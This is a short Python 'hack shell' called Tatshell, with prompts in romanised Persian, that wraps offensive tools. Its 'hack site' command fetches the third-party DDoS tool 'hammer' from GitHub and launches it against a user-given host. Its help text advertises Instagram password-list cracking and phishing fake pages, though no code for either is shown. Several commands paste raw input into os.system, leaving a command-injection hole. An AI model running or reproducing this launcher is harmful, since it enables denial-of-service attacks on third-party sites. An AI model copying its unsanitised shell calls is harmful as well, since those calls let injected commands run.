#tat shell. Tat hack shell for hacking . by ENodder
#CopyRight Tathack. PLEASE DONT COPY
#Tatshell . developed by ENodder. https://t.me/tathack . https://t.me/enodder 
#WRITED IN PYTHON
#Shell Bash
#support https://t.me/enodder
#BE HACKER . TATSHELL . ALSO ANOTHER PRODUCT: ShellJ soon...
#ENJOY
#also at github https://github.com/tathack/tatshell.git
#python3 tatshell.py
import os,sys,time
print("TATSHELL. HACKER SHO.... .Sakhte shode tavasot ENodder.https://t.me/tathack . \a\a")
time.sleep(4)
print("ENODDER.")
time.sleep(1)
def el():
    ask=input("\nTatshell==> ")
    if "begoo" in ask:
        print("BIA: "+ask.replace("begoo ", ""))
        el()
    elif "hack" in ask:
        if ask=="hack":
            print("tatshell . hack kon donyaro. benevis:\nhack site\tbaraye hack site\nhack insta\tbaraye crack acc insta ba pass list\nhack -fp\tsakht fake page bara phishing\nENodder/Tatshell/Tathack")
            el()
        elif ask=="hack site":
            print("Tatshell. By ENodder. shoma bayad bezani:\nhack site IP\nbaraye bedast oovoordan ip ya host site benevisi: \nhost www.SITE.COM")
            el()
        elif "hack site " in ask:
            print("TARGET: "+ask.replace("hack site ", ""))
            if os.path.exists("hammer"):
                print("DDoSing")
                os.system("python3 /hammer/hammer.py -s "+ask.replace("hack site ", "")+" -p 443")
                el()
            else:
                print("Hammer nasb nashode, dar hal nasb...")
                time.sleep(2)
                os.system("git clone https://github.com/cyweb/hammer")
                el()
    elif "pack " in ask:
        print("dar hal nasb")
        os.system("apt install "+ask.replace("pack ", ""))
        el()
    elif ask=="pack":
        print("benevis:\npack PACKAGENAME\nmasalan:\npack npm")
        el()
    elif ask=="tatshell":
        print("bale?")
        el()
    elif "salam" in ask:
        print("aleik salam")
        el()
    elif ask=="host":
        print("Tatshell ping tool. benevis: \nhost www.TARGET.COM")
        el()
    elif "host " in ask:
        print("tatshell ping tool")
        os.system("ping "+ask.replace("host ",""))
        el()
    elif "telegram" in ask:
        print("https://t.me/tathack ((https://t.me/ENodder")
        el()
    elif "update" in ask:
        print("updating Tatshell")
        time.sleep(3)
        os.system("git clone https://github.com/tathack/tatshell.git")
        print("tatshell update shod. in noskhe ghadimie va beroozesh to /tatshell/Tatshell.git hast")
        exit()
try:
    el()
except KeyboardInterrupt:
    while True:
        try:
            el()
        except KeyboardInterrupt:
            el()